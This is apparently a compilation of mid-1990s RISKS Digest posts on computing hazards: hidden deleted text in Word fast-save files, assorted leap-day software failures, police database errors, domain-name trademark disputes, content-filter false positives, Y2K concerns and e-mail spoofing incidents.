I am not defending Microsoft's products in any way.  I use them because I
have to and I don't care about which vendor's product is "better" as long as
the one I have allows me to get the job done effectively.  It appears that
the Microsoft fix does indeed work and we may now direct our thoughts to
other topics.  I am also surprised that Microsoft addressed this problem so
quickly!  ;-)

<P>
Several authors have noted the presence of "extra data" within Microsoft
Word files.  These are frequently found in files that use the "Quick Save"
feature of Word.  Here a document is first saved as a baseline and
subsequent saves will only update it with the changes.  Another feature of
Word is the "Undo" command.  Any text that is deleted from the document can
be "Undone" up to the point of the last save.  Thus an "Undo" cannot
retrieve text from a previous increment of the document.  However, all of
the deleted text is still within the original document.  This can be
verified with a disk editor.  The best way to remove this undesired text is
to user the "Save As" command create a new document.  All of the deleted
text is left behind in the original document.  The obvious risk is taking a
classified document and trying to remove classified data to create an
unclassified document.  Unless a new document is created, all the deleted
data is still part of the "unclassified" document.  Word will not display
the deleted text, but a disk editor or non-Word word processor will be able
to display it.
<P>
On another note, the problem of extra data found between the end of file
mark and the end of sector has been around since the beginning of DOS.  DOS
will fill the space with random data from memory.  I have seen disk
directory data and parts of documents in that space.  This also is a problem
when unclassified files were copied from a classified machine onto a floppy
disk.  Special utilities were created to zero fill these "slack bytes" as
they were called.
<P>
The bottom line is, if you want to be sure that unintended data is not
included in a Word document, check it with a disk editor.  They usually have
an ASCII/HEX find feature that will scan the file.  It will find any text in
a document that Word refuses to display on the screen.  The disk editor will
also display the slack bytes in a file.  These procedures are needed only if
you have very sensitive data that should not be disclosed.

<P>
I came across an interesting security problem with Word not too long ago.  I
was preparing a highly confidential document for release to the licensees of
the technology of the company I work for, and the company lawyer had given
me a paper stack of pending patent application abstracts.  I was to format
these and include them in the document I was preparing.  For each patent
application, there was a figure and a single paragraph.
<P>
I also got the same information on disk.  I would edit the disk information
into my document and reserve white space for where the figures would be
pasted in.  I was given paper copies of the text, so I could match up the
stuff on disk with the paper figures.
<P>
A funny thing happened when I opened up the file on my Mac.  The Mac version
of Word is always downrev from the PC version, and so I lost all the
formatting of the file.  That's okay because I was going to re- format it
anyway.
<P>
But even after stripping out all the formatting information which had become
garbage, the text itself was slightly mutilated, with large blocks of text
in out-of-order sequence.  Fortunately, I had the paper copies, so I could
reconstruct the file fairly easily.
<P>
But then I discovered I had something like a dozen paper figures and
paragraphs, but more like 20 paragraphs in the disk file.
<P>
The next day, when I asked the lawyer whether he had forgotten to give me
paper copies of some of the stuff on disk, he was surprised I had those
extra paragraphs.  Those were for patent applications that hadn't even been
filed yet, and were definitely NOT for release to the licensees before then!
<P>
What happened was he had taken a larger file, edited out the stuff I wasn't
supposed to see, then copied the file to a floppy.  I converted the file to
the Mac, and reconstructed the original file.
<P>
When you save a file in Word, it usually does a "fast save".  That means a
small amount of information is saved that tells Word what changes you made
to the original.  That's faster than actually re-writing the whole file.
<P>
You can disable this "feature".  I suppose Microsoft should make that as the
default.  Or, you can do a "Save As", which will force the true file to be
written out.

<P>
We are so worried about the year 2000 and what it will do to our
programs, we fail to realize that 29 Feb still causes headaches with
programs.  We are running an older version of a mail package called em on
our unix systems.  Seems em went nuts today trying to interpret the date Feb
29.  I captured the output of a few commands and no, I have not just put in
the weird dates.  This is what em gave me.
<P>
For those interested, "i" is used to get an index of mail messages,
"r" to normally read a message, "R" to head the message including the

So we have four different date interpretations for 29 Feb 1996.  They are:
"28 Feb 96", "1 May 131", "10 Jan 1936", and "1 Jan 70".  Actually another
one I saw but was unable to reproduce was "29 Dec 95"!

Frederick, apprenticed to a PIRATE instead of a PILOT in Gilbert and
Sullivan's *Pirates of Penzance*, would have had his thirty-fifth birthday
today.  In the operetta, at the time he had lived for 21 years in 1877, he
was informed that his indentures were not over because he had not reached
his 21st birthday -- which he then figured out would occur in another 63
years, on 29 Feb 1940.

Frederick: "In 1940 I of age shall be.<BR>
I'll then return and claim you, I declare it."<BR>
Mabel: "It seems so long!"

<P>
The Police Department's stolen-car computer system has brought grief to
still another motorist.  Lester Luis, 23, of Elmhurst, Queens, said
yesterday he was roughed up and arrested Friday after cops pulled over his
car -- because the computer said it was stolen.
<P>
In a similar case two weeks ago, Lebert Folkes, 30, was shot in the face
by police who stopped him after the computer told them he was driving a
stolen car.  Police later admitted they made a mistake.  ...
<P>
Both cases involved cars that had been reported stolen -- but then
recovered without being cleared from a police computer that tracks stolen
vehicles.
<P>
The risks are obvious... no word yet on who's to blame.  TR

Hackers in the UK managed to amend the software of a talking bus stop- it
gives spoken information(as written information and display screens are
vandal-prone and useless to partially- sighted people). The talking bus
stops became quite abusive. The RISK is that when a drunk on the last bus
home hears a lot of swearing and you are the only other person in sight, you
might be assumed to be the source of the insults, and of course the
passengers might take the wrong bus or miss the last one - a passenger who
has been taken miles out of his way in bad weather can be a big risk for the
driver of a one-"man" bus. These risks can be exaggerated - the talking bus
stops I have come across work so rarely that any sound from them comes as a
surprise.
<P>
In the same vein, a car I once owned was fitted with a radio which
suppressed all hiss when there was no signal. It worked so well that I
didn't even know it was left switched on - the waveband it received seemed
to apply only to Japan or Korea. When I moved to Brighton, the radio
suddenly boomed into life and I nearly drove off the road in shock.
<P>
I also used to work for a telephone company. The salesmen spent a lot of
time in Singapore, where you could buy a highly-illegal hand-held radio
which could broadcast on the most popular BBC news channel ("Radio 4"). If
drivers annoyed him, the salesman would point the transmitter at the
offending car and could usually make a rude message come out of the driver's
car radio. In view of some of the cases of "road rage" we have had here, the
radio was probably more of a risk to its owner than to anyone receiving the
messages - if the listeners ever realised how the message got to their car
radio.

<P>
I had an interesting, if minor, accidental deletion today. Granted,
it turned out to be my fault, but it is instructive anyhow.
<P>
I came back to my PC, which had Windows for Workgroups 3.11 up, to find
it displaying a dialog box asking me to confirm the deletion of a program
icon. I clicked "no", then poked around and noticed that another program
icon (the DOS prompt) was missing.
<P>
Then I noticed a stack of papers that I had carelessly flopped onto my
desk, and, incidentally, onto the lower right corner of my keyboard. What
had apparently happened when I flopped the papers down was that the DEL key
had been hit, followed by the ENTER key, followed by the DEL key again. (On
nearly every PC keyboard made today, the DEL and ENTER keys appear in the
extreme lower-right corner).
<P>
The currently-selected icon had been the DOS prompt; Windows had
interpreted the DEL as my wanting to delete it, and the ENTER keystroke as
my having confirmed the deletion. It then selected the next icon, and
processed the DEL keystroke similarly.
<P>
The RISKs: First and foremost, having "yes" selected as the default
confirmation selection. Second, the position of the DEL/ENTER keys.  Having
(relatively) powerful actions assigned to keys that are in easy-to-strike
positions is asking for problems.
<P>
Another anecdote along the lines of that latter RISK: I work in a
support group servicing several hundred users, a large portion of whom have
new Gateway computers. The Gateway keyboard has a nifty key remap facility:
you press the "REMAP" key, then press the key you wish to modify, then you
press the key you wish to assign to the first key.  Sounds nifty until you
have to support it: the REMAP key is in the very upper-right corner, just
hanging out in the breeze, waiting for some unsuspecting user to tap it by
accident. Which happens several times a week.

<P>
[Based in part on my article which appeared in the *San Jose Mercury News*,<BR>
26 Feb 1996, with additions.  SLG]
<P>
TRADEMARKS IN CYBERSPACE
<P>
Over the past year, the Internet has been struggling with the role
trademark law should play in cyberspace. The problem is that while Apple
Computer Inc. might want a name like newton.com for a Web site to help
promote its Newton personal digital assistant computer, Nabisco might want
newton.com to advertise its Fig Newtons.
<P>
Complicating the matter still is Mark Newton, a computer enthusiast in
Brighton, Mich., who runs a bulletin board called the Newtonian BBS. Newton
obtained the domain name newton.com in April 1994.
<P>
For years, Internet domains were registered on a first-come, first-serve
basis. Last summer, Network Solutions Inc., the company that runs the
InterNIC, decided to change the policy.
<P>
The InterNIC rules are complicated. But they work roughly as follows,
according to David Graves, NSI's business manager:
<P>
A person or company can register any domain name not already taken. But if
another person or company then says it holds a ''valid and existing
trademark that is identical'' to that domain name, and if the trademark was
registered before the domain name was awarded, the party holding the
trademark has the right to get that name. The party that registered the
domain name first then has the right to prove that it also has a federal
trademark on the name.
<P>
Assuming the party that registered the domain doesn't hold the federal
trademark, NSI gives that person or company ''the ability to register a
different name, and will give them 90 days of simultaneous use. The purpose
for that is to give them the opportunity,'' to migrate to the new name,
said Graves.
<P>
In the case of newton.com, both Newton and his Internet service provider,
Innovative Concepts of Ann Arbor, Mich., say they have been contacted by
Apple, which has threatened a lawsuit unless they relinquish the name.
<P>
''I haven't done anything wrong,'' Newton said. ''Do I need to trademark my
last name to use it?''
<P>
Apparently so. Under Network Solution's policy, Mark Newton's newton.com
domain has been turned off until the dispute is resolved. That's left more
than 300 people who were using newton.com stranded without a domain, says
Mr. Newton.  So he's looking for people who can help him fight the billion
dollar company. He says that any lawyer interested in helping---especially
an attorney who specializes in intellectual property---should send him mail
at <A HREF="mailto:mark@ic.net">mark@ic.net</A>. Don't send mail to <A HREF="mailto:mark@newton.com">mark@newton.com</A>, says Mr. Newton,
because it doesn't work.
<P>
Newton points out that Apple doesn't really need the newton.com ,  because
the company is already using newton.apple.com.
<P>
Apple never comments on threatened lawsuits, said Lynne Keast, a company
representative.

<P>
Just last week I applied for the new Abn-Amro (a very large Dutch bank)
OfficeNet Electronic Banking product. The general conditions that come with
the product are worth a mention here. I've tried to make a reasonable
translation of the pertinent parts of the liability clause. (BTW. this is a
business product, not for private banking)
<P>
&quot;9 Liability
<P>
9.1 Bank agrees to ensure complete and secure EB (Electronic Banking; pvk) to
the best of its powers.
<P>
9.2 Bank is not to be hel liable for any damage whatsoever incurred by Client,
Bank and/or third parties c.q. Client absolves Bank of claims from third
parties pertaining to:<BR>
-...(passing software on to third parties)<BR>
-...(misuse or abuse of security measures)<BR>
- not, not timely, not correctly and/or not completely functioning of EB, the<BR>
Software and/or the EB-Server, unless and in as much as damage is attributable
to malicious intent or gross error by Bank. ... (disclaimer for changing of
software or running software on a PC-platform other than specified by Bank)
<P>
The risks? How well has this software been tested? How reliable is it? What
are the incentives for the bank to ensure the reliability and security of the
software if they can never be blamed for errors?
The 'PC-platform' thing is another strange one. No platform has been specified
in the general conditions or any accompanying form or contract. The sales
documentation states using MS-Dos 3.3 (or higher). This would invalidate using
the software on a Unix system, Windows, NT, OS/2, even IBM-Dos.

<P>
&gt; But if you don't go there, they can't do anything to you :)
<P>
I believe that Airbus Industries is based out of France.
<P>
I also believe that France has an extradition treaty with the U.S.
<P>
Given those two points, "they" certainly CAN do things to you, such
as charging you with libel under their laws, and asking to have you
extradited so that they can prosecute you for your crimes.
<P>
At that point, I think it would be up to the government agency
handling extraditions to decide whether or not they are going to
proceed.  In cases involving "individual vs individual", I suspect
that the government agencies are unlikely to act.  Simply because of
the effort involved in such a request.
<P>
However, in the case of a semi-governmental entity, like Airbus, such
a request for extradition of an individual might well be carried through.
<P>
While I feel for the individual so charged, the actual prosecution of
such a case would be an incredible precedent setter the internet.
<P>
If the case were dismissed due to the fact that the supposed offense
originated in a foreign country, and therefore the laws of that country
apply, it would be a large step towards creating a network for global
free expression.
<P>
If the case were carried to the limit, and the decision went against
the individual, it would be a horrid precedent that the tightest laws
in the world control what you can and cannot prudently say on the network.

Akin to the "xxx" in NYNEX's URL's, but much worse if the CDA survives,
there are domain names with "indecent" words in them which do not actually
have any obviously indecent material on them.  Merely by providing a link to
these pages you will be causing most web browsers to display the indecent
words when the user moves the mouse over the hypertext link.

Our earlier discussion about web robots' troublesome habits came back to me
when I read about the name of a NYNEX web page dealing with ISDN access
which contained the letters XXX.  While SurfWatch and other programs might
block this, NYNEX may have done some clever marketing.
<P>
ISDN is very useful to people who download large files (maybe naughty
pictures?) from internet sites.  By putting XXX in the HTML code of their
page (i.e. in one of the links), NYNEX would get their ISDN page to be
located by web robots searching for "XXX" - and would address this market
segment.  Either a clever marketing ploy or an accidental misfortune.

&gt; ... SurfWatch, deftly noting the "xxx," decided I was trying to<BR>
&gt; access something naughty and blocked the page.
<P>
SurfWatch responded to the e-mail by immediately unblocking all blocked
NYNEX locations.  As a company, we are trying to provide tools for parents
and teachers to help them choose what they want to see on the Internet.  We
have found, in our surfing, that sites with "XXX" in the URL almost always
contain sexually explicit material.  In fact, many Adult content providers
have used the "XXX" as a tag to indicate adult-only material.  Therefore, we
block those sites.  In some cases when we have explained this to webmasters,
they have quickly changed their URL addresses, but we are also willing to
unblock individual pages if the address change is not appropriate.
<P>
SurfWatch continues to work to keep the Internet an open and free place for
people to communicate and exchange ideas.  We believe that software such as
SurfWatch provides an alternative to Internet censorship by empowering
individuals to make choices.

<P>
I received a very nice letter today from Ann Duvall, president of SurfWatch
Software, in response to my submission to RISKS 17.80. She explained the
company's (understandable) rationale that most pages with "xxx" in their
name do contain "sexually explicit material," as I had guessed. She also
informed me that NYNEX's site is now exempted from SurfWatch restrictions,
in order to resolve this particular instance of the conflict.
<P>
In the area of software company responses to user complaints, this is
certainly top-notch. I somehow can't picture Bill Gates writing to people
who post to RISKS about Microsoft products, much less seeing that the issues
they mention are resolved. :-)

Mark's scenario is avoidable, if we, the experts, do our best to make sure
the public is aware of one fact: That the worst that can happen at the
consumer level, is slower processing for a while; no data -- and more
important, no customer money -- will be lost, and all miscalculations could
be backtracked and amended later.

If one exaggerates a little bit on Mark's theme, we are discussing the end
of civiliation caused by the turn of the millennium.  It reminds me of Isaac
Asimov's classic story; "Nightfall".
<P>
This is a particular risk I don't recall having seen before in Risks. i.e.
The event so infrequent, that no matter how predictable it is, or how
much advance warning we have, society never does prepare to deal with it.
<P>
Is it a flaw in our risk perception where we incorrectly equate
infrequent==unlikely or infrequent==insignificant?

In his book "A Mathematician Reads the Newspaper" (BasicBooks, 1995, hc,
ISBN 0-465-04362-3, 203 pages), John Allen Paulos has a chapter entitled
"Researchers Look to Local News for Trends". In it, he mentions Robert Louis
Stevenson's story, "The Imp in the Bottle". Here's what he says:
<P>
The story is about "a genie in a bottle who will satisfy your every wish for
love, money, and power. You can buy this amazing bottle for any amount that
you care to offer. The only constraint is that when you are finished with
the bottle, you must sell it for less than what you paid for it. If you
don't sell it to someone for a lower price, you will lose everything and
suffer everlasting torment in hell. What would you pay for such a bottle?
<P>
"Certainly you won't pay 1 cent for it because then you won't be able to
sell it for a lower price. You won't pay 2 cents for it either, since no one
will buy it from you for 1 cent for the same reason. Neither will you pay 3
cents for it; the person to whom you would have to sell it for 2 cents
wouldn't be able to sell it for 1 cent. A similar argument applies to a
price of 4 cents, 5 cents, 6 cents, and so on. Mathematical induction can be
used to formalize this argument, which proves conclusively that you
shouldn't buy this magic bottle for any amount of money. Yet you would
almost certainly buy it for $1,000. I know I would. At what point does the
argument against buying the bottle become practically convincing?"
<P>
Sounds like we should all withdraw our savings NOW!! But we won't, because we
trust everyone else in the world to behave just as irrationally as we do.
<P>
Readers of the Risks forum will particularly appreciate Paulos's chapter
"Ranking Health Risks: Experts and Laymen Differ", but really the whole book
is well worth checking out.

Investigators have concluded their analysis of the 6 Feb 1996 Boeing 757
flight that ended in the ocean, killing all 189 people aboard.  The disaster
was apparently due to a faulty velocity indicator that misled pilots,
leading them to believe that their speed was adequate when they were flying
at 7000 feet.

The Denver area's new car-emission testing program was spotlighted on the
local TV news.
<P>
It seems that given the two passcodes 00010 and E35E, the computerized
system will pass any car regardless of the emissions results.

Disciplinary action has been taken against the people involved, including
the two people who reported the abuse.

noted the flaky calculations of Pirate Frederick, because of the
leap year in 1900.
<P>
What we know for sure is that Frederick, when confronted by the Pirate King
with the news that he had not actually reached his 21st birthday and
therefore could not be freed from his indentures, calculated that he would
have his 21st birthday in 1940.  I cited the libretto in <A HREF="/Risks/17.81.html">RISKS-17.81</A>.
<P>
The first performances of *Pirates* were at the end of 1879.  The official
opening was in New York at the Fifth Avenue Theatre on 31 Dec 1879, with a
sneak preview at the Royal Bijou in Paignton, Devonshire, the night before
-- which had been postponed by one day; perhaps W.S. Gilbert had desired to
have the sneak preview on *29* December!).
<P>
I presume that Gilbert did the calculation on Frederick's behalf, and did
*not* know about the 1900 anomaly.  I also presume that Frederick did not
know about the 1900 anomaly, because he had been brought up by his nursemaid
Ruth and the pirates mostly at sea.  On the other hand, the pirates were not
really pirates, but rather noblemen who had gone wrong (as we discover in
Act Two), in which case they probably wouldn't have known anyway.
<P>
If we assume that Gilbert and Frederick both did not know about the 1900
anomaly, then Frederick must have been born in 1856.  If, on the other hand,
Gilbert endowed Frederick with modern algorithmic powers, then perhaps
Frederick was indeed born in 1952.  I doubt it very much.
<P>
However, I have spent so much time lately correcting folks who think 2000 is
NOT a leap year (including one would-be contribution that warned about all
the folks who seem to think 2000 *is* a leap year) that I neglected to
remark on the 1900 glitch.
<P>
Incidentally, Clive also noted Isaac Asimov's *Black Widowers* story, which
raises the 1956/1900/1940 question and the fact that *Pirates* might not
actually be set in 1877, the year that *H.M.S.Pinafore* was written.  Asimov
seems to have thought of *everything* long before everyone else, but I still
suspect Gilbert did not know about, or simply ignored, the 1900 glitch.

We received the following announcement from our Institute computer center
(ISC) regarding the operating system on many of their computers (names of
individuals and systems, and phone numbers, elided):
<P>
&gt; Date: Thu, 29 Feb 1996 13:26:19 -0400 (EDT)<BR>
&gt; From: xxxxxx<BR>
&gt; Subject: FYI... an oops on the part of DEC and OSF<BR>
&gt;<BR>
&gt; 29-Feb-1996 - Digital UNIX/DCE leap year bug<BR>
&gt;<BR>
&gt; ISC's UNIX computing systems have encountered a severe bug in the<BR>
&gt; operating system.  The bug prevents DCE from functioning at all between<BR>
&gt; February 29th and March 31st during a leap year.  To allow our DCE<BR>
&gt; systems to continue functioning, the date on all of ISC's system has<BR>
&gt; been set to April 1st.<BR>
&gt;<BR>
&gt; This affects the following systems:<BR>
&gt;<BR>
&gt;    ...<BR>
&gt;<BR>
&gt; and the following services:<BR>
&gt;<BR>
&gt;    Web Server, Listserver, Dial-IP, News Server<BR>
&gt;<BR>
&gt; Digital is working very hard to correct this problem as it affects all<BR>
&gt; of their DCE customers.  As soon as Digital has a solution it will be<BR>
&gt; installed and the date will be returned to normal on these systems.<BR>
&gt;<BR>
&gt; Please contact the ISC HelpDesk at nnn-nnnn voice or nnn-nnnn v/tty,<BR>
&gt; stop by our office in Ross room A291, or use ASK Information Systems and<BR>
&gt; Computing for questions or concerns.
<P>
True to the message, the system date on the affected systems continues to
be one month ahead (today, for instance, is April 2, 1996 according to
these systems).
<P>
One wonders exactly how an extra day in February causes the loss of an
entire month in this particular OS....  In any event, there will be many
unexpected side-effects of this glitch; at a minimum, once the bug is
corrected and the date can be restored, software which examines timestamps
such as modification dates on files may be in for an interesting few weeks.

[A little bit of background:  Here in Arizona, about 6 months ago
they changed vendors for the machines for the state lottery.  Evidently
this company bid lower, and would require 1 fewer keypress per ticket
sale.  The initial install was a debacle, with roughly 40% of the machines
not being brought on-line in time because of communications problems
and weather problems at the time.  And so the saga continues...]
<P>
Machines refuse to recognize 29 Feb 1997 (*Arizona Republic*, 1 Mar 1996)
<P>
Chuck Brooke, executive vice president of AWI's [the lottery machine
vendor] Phoenix office, said the glitch was the result of an error made by
the corporation's software designers in Hackensack, N.J.  The leap-year
glitch did not affect AWI's other state lottery clients in Delaware,
Florida, Michigan, Minnesota, Pennsylvania, South Dakota and Washington
state, he said.
<P>
It is estimated that roughly 60,000 people were unable to purchase tickets.
This only affected the Fantasy 5, and not Powerball, Lotto and the
Scratchers tickets.
<P>
I never buy lottery tickets anyway, but I wouldn't plan on buying any at
the end of 1999.  ;)

Another leap-day bug....<BR>
I was shopping for a new auto insurance policy today, and found one I
liked.  When I went to the agent's office, though, he told me that he
couldn't write a one year policy.  The computer that sets up the policies
adds one to the year to get the expiration date.  A policy written on Feb.
29, 1996 would expire at 12:01am Feb. 29, 1997.  Uh oh.  He my the policy
up to start March 1, and I'll keep my old policy for one more day.

The Gartner Group predicts that half of all companies affected by the year
2000 date field problem will still be unprepared when the fateful day
arrives.  "A lot of companies are like deer frozen in the headlights of a
big truck coming right at them," says a Gartner analyst.  Some industry
experts estimate the cost of fixing the problem at $40 million per large
corporation, with the global price tag pegged at $400 billion to $600

the trouble: "Do we just fix the millennium bug, or should we take this as
an opportunity to put in some new systems?" asks one CIO.  (Information Week

Japanese newspaper Asahi-shimbun had a large news article concerning the
year 2000 and computer programs.  From the article, I learned that many
Japanese offices of credit card companies are now refusing to issue credit
cards of which expiration date is later than December 1999. (I didn't know
this. A clever interim solution, I have to agree.)  They are trying to
upgrade all the verification devices(?) at cooperating stores before issuing
such cards.
<P>
I also got the impression that the biggest problem is who is going to pay
for the upgrade of such machines.

&gt; Is it a flaw in our risk perception where we incorrectly equate<BR>
&gt; infrequent==unlikely or infrequent==insignificant?
<P>
Perhaps the options should include:  c) infrequent==I'll take care of that
later; and  d) infrequent==It will be someone else's problem.
<P>
Having been through the turn of the century problem once already (the 19th
century), I've watched the discussions with a certain bemusement. In the
early 70's I inherited a system with several accounts that were in arrears
since 1895. The key program subtracted the original date from the current
one and tried to calculate interest for -24 years.
<P>
As might be imagined, it was a government system. A legal fight had been
abandoned by both sides, but no one was prepared to write off the charges
without a final court decision. The clerks had been dutifully copying the
items from ledger to ledger for 75 years.
<P>
I applied option (d) and patched around the affected accounts, leaving the
proper resolution to _my_ successor. Since then I've applied option (c) more
often I'd like to admit. Even though I knew better, human nature is perhaps
the biggest risk of all.

<P>
Mark Brader's article "Risks of year-2000 precautions" (<A HREF="/Risks/17.80.html">RISKS-17.80</A>) is a
specific case of a risk that is growing every day.
<P>
During a typical day we count on the law of averages treating us reasonably
well.  For example, not everybody will choose to eat at the restaurant you
go to for lunch today.  Not everyone will take a sidetrip on the freeway you
commute on today.  Not everyone will access your favorite web site when you
want to use it.
<P>
Only recently has news about local events been so readily and quickly
available that the law of averages may fail to be a friend.  A review of a
luncheon special at your restaurant on the net at 10 a.m. could mean that
half your town decides to go there for lunch.  A mention at 4 p.m. of a
store giveaway off your freeway may send half the city on the freeway you
need.  And a positive review in a magazine of your favorite website may send
millions of people to it over a weeks time, making it useless to you.
<P>
As our access to timely news about specific future events grows, along with
our improving mobility in real and cyber space to take advantage of them, we
may be overcome with instant, temporary fads that sweep across the landscape
like tsunamis.  People who are listened to (e.g., Dyson) will have to be
very careful what they say for fear of the effect.  In the worst case of the
frenzy chasing ephemeral fads, people may die (in collisions and crushes),
so self-censorship will become the norm.
<P>
The engineering principle of positive feedback can be applied to the time
constants involved to predict this risk.  And the more tied into cyberspace
we all are, the worse it can get.  (Of course, this has been covered in the
Science Fiction literature, but I can't remember which ones.)

<P>
Some time ago we had a scare about the an oil crisis.  People changed
their gas buying habits, filling the tank up more often than normal.
This alone caused a shortage.  Let me illustrate:
<P>
Consider a population of 100 million vehicles each with a ten gallon
gas tank.  Assume that each driver fills the tank when it is empty.
This results in 100 million tanks with 5 gallons each or 500 million
gallons of gas in a "rolling reserve" of fuel.
<P>
Now assume that a shortage is announced and that people fill their
tanks when they are half empty rather than when they are empty, after
all with a shortage you don't want to run out of gas.
<P>
This will result in cars running around with 7.5 gallons of gas in
their tanks.  The "rolling reserve" now is raised to 750 million
gallons.  Whatever the situation was when the shortage was proclaimed
it is now 250 million gallons worse.
<P>
Conclusion, shortages and the hoarding that results will make
situations worse or will make bad situations appear where there was
nothing to drive them in the first place other than a rumor.

<P>
I've just managed to sort out a problem with my Visa credit card here which
all stems back to a poorly worded (if not downright wron) menu on an ATM
screen.
<P>
At work our local credit union have installed an ATM for our convenience.
When you go up to it and swipe your card, it brings up menu items, including
one that says it can transfer money between accounts. I got my Visa card
from the credit union, so this seemed a good way of paying my bill fast and
not have to worry about mail delays etc.
<P>
I selected "transfer money", "from checking", "to credit card", keyed in the
amount and got a receipt for it.  All good and well.  2 weeks later I got a
letter from Visa saying that I had exceeded my credit limit and they had not
received my payment for the last statement.  I phoned up the local branch
and was informed that the ATM at work, is only for dispensing cash and not
other transaction.
<P>
My account history doesn't show me trying to take money from my checking
account, so if I didn't have the receipt I would have been out in the cold.
<P>
If anyone out there works for banks/etc., it would perhaps be a good idea to
put code in to say "you can't do that from here..." and *not* issue a
receipt that says the amount has been paid.

CYBERSPACE LAW FOR NONLAWYERS
<P>
Three highly respected law school professors (Professor Larry Lessig,
University of Chicago Law School; Professor David Post, Georgetown
University Law Center; and Professor Eugene Volokh, UCLA School of Law)
have written a *FREE*, online cyberlaw workshop called, appropriately,
"CYBERSPACE LAW FOR NONLAWYERS."  CYBERSPACE LAW is specifically written<BR>
for lay people like you and me, and the workshop's lessons use
easy-to-understand English -- NOT legalese and Latin!
<P>
YEAH, BUT WILL I *UNDERSTAND* IT?
<P>
Actually, yes. The workshop's authors really are writing CYBERSPACE LAW's
lessons for educated lay people, *NOT* lawyers.
<P>
I took a look at an earlier article written by one of the workshop's
professors (Eugene Volokh, "Cheap Speech and What It Will Do", 104 Yale
L.J.1805 (1995)), and I have to say that I am quite impressed ... although I
have to say that I am quite disappointed that Volokh did not have a single
Southern word *anywhere* in his article :)
<P>
WHAT WILL THE WORKSHOP COVER?
<P>
CYBERSPACE LAW is going to help you learn the basic principles of -- and
unlearn some common myths about copyright law, free speech law, libel law,
privacy law, contract law, and trademark law, as they apply on the Net.
Each CYBERSPACE LAW "lesson" should be about the size of an average TOURBUS
post (about a page or two), and will e-mailed to you through an e-mail
distribution list.  The CYBERSPACE LAW workshop will last a couple of weeks,
and you'll get two or three letters a week from the authors ... and, best of
all, the entire workshop is FREE!
<P>
THE INSTRUCTORS
<P>
Professor Larry Lessig clerked for U.S. Supreme Court Justice Antonin
Scalia, and now teaches constitutional law and the law of cyberspace at the
University of Chicago Law School.  He's written about law and cyberspace for
the Yale Law Journal and the University of Chicago Legal Forum
(forthcoming).
<P>
Professor David Post practiced computer law for six years, then clerked for
U.S. Supreme Court Justice Ruth Bader Ginsburg. He now teaches
constitutional law, copyright law, and the law of cyberspace at the
Georgetown University Law Center.  He's written about law and cyberspace
for the University of Chicago Legal Forum (forthcoming) and the Journal of
Online Law, and writes a monthly column on law and technology issues for
the American Lawyer.
<P>
Professor Eugene Volokh worked as a computer programmer for 12 years, and
is still partner in a software company that sells the software he wrote for
the Hewlett-Packard Series 3000.  He clerked for U.S. Supreme Court Justice
Sandra Day O'Connor, and now teaches constitutional law and copyright law
at the UCLA School of Law.  He's written about law and cyberspace for the
Yale Law Journal, Stanford Law Review, Michigan Law Review (forthcoming),
and the University of Chicago Legal Forum (forthcoming).

Today was apparently a bad day for spamming spoofs at the White Hoise.
There are reports of huge quantities of e-mail being sent to various
addresses at WhiteHouse.gov with header fields such as
<P>
&gt; Subject: You are now subscribed to the RISKS list
<P>
and evidently many other lists.  I received at least 10 autoresponder
replies from whitehouse.gov with the subject field
<P>
&gt; Subject: Re: You are now subscribed to the RISKS list
<P>
The beleaguered mail server at WhiteHouse.gov has evidently been spewing out
automatic standard responses to each mailing, with the return address coming
back to the LISTSERV.  There is now a subscription at UBVM for the Vice
President that was not there the last time I reviewed the list (which
coincidentally happened to be yesterday!).  This is a very ugly situation,
and clearly will cause the whitehouse site much grief in trying to
unsubscribe massively.  Unfortunately, e-mail spoofing is still vastly too
easy.  All of the past cries in RISKS for a much more secure infrastructure
bear repeating.  And April Fools' day is only four weeks away, to make
things worse -- reminding us of all the more benign spoofs of past years.
<P>
I hope this flurry of annoying activities does not prompt some hasty
legislation trying to make spamming and spoofing illegal.  If the
Communications Decency Act (CDA) experience is followed, and if the
California Computer Crime law is any guide (which in essence makes it
illegal to read, write, alter, or delete information -- rather broadly
making *all* uses of computers potentially illegal), we could wind up with
an unworkable definition of spamming and spoofing that includes sending
e-mail to more than one person.  Here is another argument for cleaning up
the infrastructure.  The WorldWide Information Infrastructure would come
screeching to a halt otherwise (and that acronym would unfortunately be
WW II).  PGN

BerkshireNet in Pittsfield, Massachusetts, was the victim of an attack on 27
Feb 1996 in which someone planted swastikas and racist messages while
masquerading as the provider's administrator, erased data on two computers,

Some people thought that our esteemed editor was incorrect (myself included)
when he said:
<P>
&gt;However, I have spent so much time lately correcting folks who think<BR>
&gt;2000 is NOT a leap year...
<P>
As one of the folks, I humbly submit the following...
<P>
As I am currently writing some backup dependent routines that I expect will
be here in the year 2000, I did some research, and found the following:
<P>
An article in IBM system User International (Issue 19, Nov. 95),
"...like many calendars, thinks there will be a February 29th in that
year - there will not be."
<P>
A Digital SPR (11-60903 13/10/93):<BR>
"...a formula suggested by the Vatican librarian Aloysius Giglio was
adopted.  It said that every fourth year is a leap year except for
century years that are not divisible by 400..."
<P>
So we have two reports that believe 2000 is *not* a leap year.
<P>
Further research was done and an Information Leaflet No. 48: 'Leap
Years' by The Royal Greenwich Observatory advises that 2000 IS a
leap year.<BR>

[Furthermore, several folks e-mailed me today that they concluded

As most readers would agree, the Royal Greenwich Observatory would have to
be a leading authority on the subject. I'll take their information as gospel!

[PGN says, check it out.  The above website points out that the length
of the tropical year is 365.24219 days.  The algorithm I know and love
that makes 2000 a leap year because it is divisible by 400 gives 365.2425
days in a year, an error of about three days in 10000 years.  So, sooner
or later we will need a further adjustment.  I hope someone decides well
in advance, to permit the programmers to get ready.  If the hassle over
1/1/2000 is any indication, the leap-year corrections to provide the
-.00031 day could also take a lot of expensive preparation, so we might
as well start teaching our young programmers soon -- just in case.
<P>
Well, are you sick of leap-year problems?  Sorry.  Three more follow,
plus a daylight-savings problem.  PGN]

In the (UK) Times newspaper, 2 Mar 1996, an article appeared reporting a
problem with laboratory equipment at Papwoth Hospital. This is one of the
main centres for the research and conduct of heart transplants and surgery
in the UK.
<P>
It seems that analytical equipment needed to carry out specialist tasks to
do with heart surgery were unable to function on the 29th of February. The
manufacturers have admitted there is a problem within the code and stated
that '...all their equipment would have the same problem.'
<P>
Fortunately all patients were treated as scheduled - other labs at the

After reading <A HREF="/Risks/17.81.html">RISKS-17.81</A>, I checked data in a spreadsheet I was working on,
and sure enough, a leapyear bug.  Microsoft Excel 3.0, both the Mac and PC
versions, has trouble with February 29th.  Enter a date for the current year
as 2/28 in a cell and it is converted to the format 2/28/1996.  Enter 2/29
